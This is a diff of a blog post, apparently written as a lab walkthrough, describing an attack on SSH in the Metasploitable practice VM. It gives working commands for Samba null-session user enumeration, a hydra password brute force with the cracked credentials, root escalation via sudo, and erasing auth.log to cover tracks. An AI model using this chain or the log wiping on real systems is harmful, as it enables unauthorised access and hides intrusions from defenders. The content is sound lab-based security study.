@@ -5,6 +5,8 @@ This time I will try my hands on the next service running on port 22. During thi
 on how to hack the Metasploitable machine. Since I want the excitement of finding something my self I have not read any post on the subject and I will not do that either.
 This means I might very well find sub-optimal solutions for some problems, deal with it!
 
+Oh and just to clear, this will be long post!
+
 ## The target
 
 I will again target the same Metasploitable VM under the exact same circumstances as last time.
@@ -111,9 +113,9 @@ Nothing fruit full yet so I turn to the next tool, `searchsploit`.
 
 Again nothing that seems directly applicable so I scrap the idea of finding an exploit manually. 
 At this stage I would apply a vulnerability scanner but I couldn't get openvas to function correctly and couldn't be bothered
-to figure out how to set it up correctly so I decided to try a common SSH vulnerability. Brute-forcing!
+to figure out how to set it up correctly so I decided to try a common SSH vulnerability. Brute forcing, but fist...
 
-### Brute-forcing
+### Enumeration of users
 
 I glance over the result from the metasploit search I did earlier to find something that would help with the brute forcing and see `auxiliary/scanner/ssh/ssh_enumusers`.
 Having a set of valid users will really help speed up the brute forcing so I check if it is applicable (edited for brevity):
@@ -137,8 +139,8 @@ Having a set of valid users will really help speed up the brute forcing so I che
       http://www.securityfocus.com/bid/20418
 
 
-This doesn't tell me the affected version I check the security focus [link](http://www.securityfocus.com/bid/20418) found under references. 
-One of the affected versions is the one are running, sweet!
+This doesn't tell me the affected version so I check the security focus [link](http://www.securityfocus.com/bid/20418) found under references. 
+One of the affected versions is the one the target are running, sweet!
 
     msf > use auxiliary/scanner/ssh/ssh_enumusers 
     msf auxiliary(ssh_enumusers) > show options
@@ -156,16 +158,160 @@ One of the affected versions is the one are running, sweet!
 
     msf auxiliary(ssh_enumusers) > set RHOSTS 192.168.56.103
     RHOSTS => 192.168.56.103
-    msf auxiliary(ssh_enumusers) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt                set USER_FILE ./usr/share/metasploit-framework/data/wordlists/default_users_for_servi
+    msf auxiliary(ssh_enumusers) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt
     USER_FILE => /usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt
     msf auxiliary(ssh_enumusers) > run
 
     [*] 192.168.56.103:22 - SSH - Checking for false positives
     [*] 192.168.56.103:22 - SSH - Starting scan
+    .
+    .
+    .
 
-After running this for a while I decided to stop the scan, it's super slow and will probably not speed up the overall process much.
+After running this for a while I decided to stop the scan, it's super slow and somehow didn't *feel* right.
+I had a hunch that something might not be well with this approach and I know for a fact that a user on the target system is `msfadmin`. 
+So tot test this out I created a new file including only this user name, ran the above with the new file but did not get a hit either 
+so the above vunerability could not be exploited.
+
+I really wanted to target all my effort on port 22 but i could figure out a way to enumerate the users via SSH so instead I decided to enumerate the users via a Samba vulnerability.
+My target is running (from my previous scan)
+    
+    139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+    
+I know as a fact that Samba can be missconfigured to allow null sessions so I give it a try:
+        
+    # rpcclient -U "" 192.168.56.103
+    Enter 's password: 
+    rpcclient $>
+
+This tells me that the machine is not configured properly so I run:
+
+    rpcclient $> enumdomusers
+    user:[games] rid:[0x3f2]
+    user:[nobody] rid:[0x1f5]
+    user:[bind] rid:[0x4ba]
+    user:[proxy] rid:[0x402]
+    user:[syslog] rid:[0x4b4]
+    user:[user] rid:[0xbba]
+    user:[www-data] rid:[0x42a]
+    user:[root] rid:[0x3e8]
+    user:[news] rid:[0x3fa]
+    user:[postgres] rid:[0x4c0]
+    user:[bin] rid:[0x3ec]
+    user:[mail] rid:[0x3f8]
+    user:[distccd] rid:[0x4c6]
+    user:[proftpd] rid:[0x4ca]
+    user:[dhcp] rid:[0x4b2]
+    user:[daemon] rid:[0x3ea]
+    user:[sshd] rid:[0x4b8]
+    user:[man] rid:[0x3f4]
+    user:[lp] rid:[0x3f6]
+    user:[mysql] rid:[0x4c2]
+    user:[gnats] rid:[0x43a]
+    user:[libuuid] rid:[0x4b0]
+    user:[backup] rid:[0x42c]
+    user:[msfadmin] rid:[0xbb8]
+    user:[telnetd] rid:[0x4c8]
+    user:[sys] rid:[0x3ee]
+    user:[klog] rid:[0x4b6]
+    user:[postfix] rid:[0x4bc]
+    user:[service] rid:[0xbbc]
+    user:[list] rid:[0x434]
+    user:[irc] rid:[0x436]
+    user:[ftp] rid:[0x4be]
+    user:[tomcat55] rid:[0x4c4]
+    user:[sync] rid:[0x3f0]
+    user:[uucp] rid:[0x3fc]
+    
+And get a list of all the users! I copy the above and create a file, paste it then format it to only include usernames:
+
+    # touch users.lst
+    # vim users.lst 
+    # cat users.lst | cut -d[ -f2 | cut -d] -f1 > users.lst
+
+The actual list contains load of juicy users but for this excercise let's focus on a single user, `msfadmin`.
+
+### Brute forcing
+
+With this is mind I turn to my number one tool for brute forcing: `hydra `. Time to bruteforce!
+
+    # hydra -L ./users.lst -P /usr/share/john/password.lst -e nsr -t 8 -u ssh://192.168.56.103
+    Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only
+
+    Hydra (http://www.thc.org/thc-hydra) starting at 2014-11-15 04:10:13
+    [WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+    [DATA] 8 tasks, 1 server, 121040 login tries (l:34/p:3560), ~15130 tries per task
+    [DATA] attacking service ssh on port 22
+    [22][ssh] host: 192.168.56.103   login: user   password: user
+    [22][ssh] host: 192.168.56.103   login: postgres   password: postgres
+    [22][ssh] host: 192.168.56.103   login: msfadmin   password: msfadmin
+    [22][ssh] host: 192.168.56.103   login: service   password: service
+    [STATUS] 303.00 tries/min, 303 tries in 00:01h, 120737 todo in 06:39h, 8 active
+    [22][ssh] host: 192.168.56.103   login: klog   password: 123456789
+    [STATUS] 268.67 tries/min, 806 tries in 00:03h, 120234 todo in 07:28h, 8 active
+    [STATUS] 274.14 tries/min, 1919 tries in 00:07h, 119121 todo in 07:15h, 8 active
+    [22][ssh] host: 192.168.56.103   login: sys   password: batman
+    [STATUS] 273.60 tries/min, 4104 tries in 00:15h, 116936 todo in 07:08h, 8 active
+    ^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
 
 
-The number one tool for brute/root/Desktop/password.lst -vV 192.168.1.1 ftpforcing is probably `hydra ` so I will launch a bruteforce attack with it:
+Success, at this point I just cancel the scan, I have proven my point and gotten a couple of user name password combos.
+Now let me exlain the `hydra` call. There are quite a lot of options to explain so the break it up.
 
-    # hydra -l -P /usr/share/john/password.lst -vV 192.168.56.103 ssh 
+    * `-L` defines the user name list.
+    * `-P` denotes a password set. I use the password list from JohnTheRipper here.
+    * `-e` gives any addititonal options, in this case; `n`, for `null` password; `s` for using user name as password; `r`, for using the username in reverse.
+    * `-t` dictates how many "tasks" should be run, defaults to 16 but has to be throtled to 8 otherwise it produces errors.
+    * `-u` tells hydra to apply each password to all users. This will find misconfigured (user name == password) users quicly
+    * Lastly we specify the actual target, in this case the protocol is defined as part of the URI.
+    
+Next we try to login to the machine via SSH:
+
+    # ssh msfadmin@192.168.56.103
+    The authenticity of host '192.168.56.103 (192.168.56.103)' can't be established.
+    RSA key fingerprint is 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3.
+    Are you sure you want to continue connecting (yes/no)? yes
+    Warning: Permanently added '192.168.56.103' (RSA) to the list of known hosts.
+    msfadmin@192.168.56.103's password: 
+    Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+    The programs included with the Ubuntu system are free software;
+    the exact distribution terms for each program are described in the
+    individual files in /usr/share/doc/*/copyright.
+
+    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+    applicable law.
+
+    To access official Ubuntu documentation, please visit:
+    http://help.ubuntu.com/
+    No mail.
+    Last login: Sat Nov  8 13:19:44 2014
+    To run a command as administrator (user "root"), use "sudo <command>".
+    See "man sudo_root" for details.
+
+    msfadmin@metasploitable:~$ sudo su
+    [sudo] password for msfadmin: 
+    root@metasploitable:/home/msfadmin# whoami
+    root
+    
+### Clean up
+    
+So I have a user, a password and I can lauch stuff as root! One of the things I have to do know is clear some my tracks.
+The file `/var/log/auth.log` will include a huge amount of information about our SSH enumeration attempt and bruteforce atack, 
+the lazy way to clean it is just remove everything.
+    
+    # grep 'sshd' /var/log/auth.log | wc -l
+    26659
+    # echo "" >  /var/log/auth.log
+    
+Here we can see that we have almost 27000 log entries related too SSH, after we wipe it nothing of that will remain.
+
+### Summary
+
+This was a lot harder than the port 21 hack but still not imposible. I made a clear mistake trying to enumerate the SSH user and should have gone
+for the Samba vulnerability right away. I was a bit to focused to do this port by port for the heck of it, but that is not how pentesting works.
+I had a wealth of information and available (and a root shell) from previous activity, so I wanted to put some restrictions on my self but had to break them.
+
+Hopefully the next hack will not be as long a write up as this one!
+
+
